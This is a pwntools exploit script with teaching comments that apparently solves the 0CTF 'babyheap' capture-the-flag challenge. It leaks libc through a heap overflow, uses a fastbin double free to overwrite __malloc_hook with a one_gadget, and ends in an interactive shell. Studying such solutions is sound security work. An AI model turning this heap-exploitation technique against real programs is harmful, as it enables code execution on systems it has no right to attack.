from pwn import *

s = process("./0ctfbabyheap", env={"LD_PRELOAD": "./libc-2.23.so"})
libc = ELF("./libc-2.23.so")

def alloc(size):
    s.sendlineafter("Command: ", "1")
    s.sendlineafter("Size: ", str(size))

def fill(idx, size, data):
    s.sendlineafter("Command: ", "2")
    s.sendlineafter("Index: ", str(idx))
    s.sendlineafter("Size: ", str(size))
    s.sendlineafter("Content: ", data)

def free(idx):
    s.sendlineafter("Command: ", "3")
    s.sendlineafter("Index: ", str(idx))

def dump(idx):
    s.sendlineafter("Command: ", "4")
    s.sendlineafter("Index: ", str(idx))
    s.recvuntil("Content: \n")
    leak = s.recvline().strip("\n")
    return leak 

alloc(0xf0)     # call this "original chunk 0"
alloc(0x70)     # chunk 1
alloc(0xf0)     # chunk 2
alloc(0x30)     # chunk 3, to prevent consolidation with top chunk 

free(0)         # the address of main_arena + 88 is now stored at freed chunk 0's address 
free(1)

alloc(0x70)     # original chunk 1, now it is the "new chunk 0"
fill(0, 0x70 + 0x10, "0"*0x70 + p64(0x180) + p64(0x100))     # to overflow chunk2, prepare to consolidate up to where the original chunk 0 is. 
free(2)			# consolidation happens 

"""
Now the chunks look like this:

0x280           => the consolidated chunk containing the new chunk 0 in it 
0x30            # chunk 3 
top chunk       
"""

alloc(0xf0)             # chunk 1, to push main_arena+88 0xf0 bytes up 
# => the next chunk to be allocated will start at the same address as the new chunk 0. And the address of main_arena + 88 will be pushed 0xf0 bytes away from where it was => the next chunk's location   

"""
0xf0        # chunk 1
0x190       # start of new chunk 0, with main_arena+88 at the start of data section 
0x30        # chunk 3 
top chunk 
"""
leak = dump(0)         # leak main_arena+88
leak = u64(leak[:8])
libc.address = leak - 0x3c4b78
before_malloc_hook = libc.symbols["__malloc_hook"] - 0x23   # will explain 0x23 later
one_gadget = libc.address + 0x4526a                         
log.info("Libc base: {}".format(hex(libc.address)))


free(1)         # to prepare for double free attack 

alloc(0x10)     # chunk 1 (not new chunk 0 as new chunk 0 is in the consolidated chunk)
alloc(0x60)     # chunk 2 
alloc(0x60)     # chunk 4 (chunk 1 + chunk 2 + chunk 4 = 0xf0 (including their metadata), which is = original chunk 0 or recently freed chunk 1) 
alloc(0x60)     # chunk 5 and new chunk 0

"""
0x10        # chunk 1
0x60        # chunk 2
0x60        # chunk 4
0x60        # chunk 5 and new chunk 0 (note that new chunk 0's metadata is overlapped by chunk 5 => its size becomes 0x60 bytes)
0x130       # free memory (consolidated chunk)
0x30        # chunk 3
"""

free(5)
free(4)         
free(0)         # double free the same chunk 

# So now the free list looks like this: chunk 0 -> chunk 4 -> chunk 5 
 
alloc(0x60)     # gives back the new chunk 0 
alloc(0x60)     # gives back chunk 4 
fill(0, 0x60, p64(before_malloc_hook) + p64(0x0) + "1"*0x50)    # because chunk 5 = chunk 0, we are editing the freed chunk 5 as well. Here we edit fd pointer to __malloc_hook-0x23 
alloc(0x60)     # gives back chunk 5

alloc(0x60)     # will return a chunk starts at __malloc_hook-0x23. Taking into account 0x10 bytes of metadata, our user data section starts at __malloc_hook-0x13  
fill(6, 0x1b, "A"*0x13 + p64(one_gadget))

# call malloc to trigger __malloc_hook which will call one_gadget
s.sendlineafter("Command: ", "1")
s.sendlineafter("Size: ", "30")
s.interactive()







